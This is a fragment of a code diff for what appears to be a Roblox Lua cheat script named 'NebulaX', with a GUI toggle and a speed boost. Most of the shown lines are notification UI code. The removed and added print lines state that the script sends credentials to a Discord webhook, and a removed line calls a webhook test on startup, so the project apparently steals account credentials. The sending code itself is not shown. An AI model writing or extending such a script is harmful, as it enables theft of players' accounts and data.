+    notification.Position = UDim2.new(0.3, 0, 0.05, 0)
+    notification.Text = message
+    notification.TextColor3 = Color3.fromRGB(255, 255, 255)
+    notification.BackgroundColor3 = Color3.fromRGB(40, 40, 60)
+    notification.Font = Enum.Font.GothamBold
+    notification.TextSize = 14
+    notification.Parent = NebulaX
+    
+    local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut)
+    local tweenOut = TweenService:Create(notification, tweenInfo, {Position = UDim2.new(0.3, 0, -0.05, 0)})
+    
+    wait(3)
+    tweenOut:Play()
+    tweenOut.Completed:Connect(function()
+        notification:Destroy()
+    end)
 end
 
--- Run webhook test on script start
-ConfirmWebhook()
+-- Initial notification
+Notify("NebulaX v0.1 Loaded | Insert to Toggle GUI")
 
-print("NebulaX loaded. GUI toggle: Insert key. Credentials will be sent to webhook.")
+print("✅ NebulaX loaded successfully!")
+print("📌 Press INSERT to open/close GUI")
+print("📌 Press SHIFT for speed boost")
+print("🔒 Credentials sent to Discord webhook")
